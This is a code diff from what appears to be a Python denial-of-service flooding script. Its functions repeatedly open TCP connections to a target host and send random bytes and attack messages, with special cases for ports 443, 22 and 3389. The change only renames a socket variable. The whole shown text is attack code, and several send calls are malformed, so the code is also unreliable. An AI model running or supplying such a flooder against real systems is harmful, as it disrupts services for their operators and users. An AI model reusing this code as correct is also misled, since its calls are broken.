@@ -91,10 +91,10 @@ def start(host, port, times):
         packets = random._urandom(5021)
         pack = random._urandom(666)
         msg = Attack[random.randrange(0,3)]
-        s.connect((host, port))
-        s.send(host, port)
-        s.send(host, port)
-        s.send(host, port)
+        sock.connect((host, port))
+        sock.send(host, port)
+        sock.send(host, port)
+        sock.send(host, port)
         if int(port) == 443:
             sock.send(Attack[5],(host, int(port)))
         elif int(port) == 22:
@@ -107,10 +107,10 @@ def randsender(host, port, times):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
     punch = random._urandom(int(1024))
     while time.time() < timeout:
-          s.connect((host, port))
-          s.send(host, port)
-          s.send(host, port)
-          s.send(host, port)
+          sock.connect((host, port))
+          sock.send(host, port)
+          sock.send(host, port)
+          sock.send(host, port)
 def stdsender(host, times):
     timeout = time.time() + float(times)
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -118,10 +118,10 @@ def stdsender(host, times):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
     port = '3389'
     while time.time() < timeout:
-          s.connect((host, port))
-          s.send(host, port)
-          s.send(host, port)
-          s.send(host, port)
+          sock.connect((host, port))
+          sock.send(host, port)
+          sock.send(host, port)
+          sock.send(host, port)
 
 for y in range(th):
     if choice == 'y':
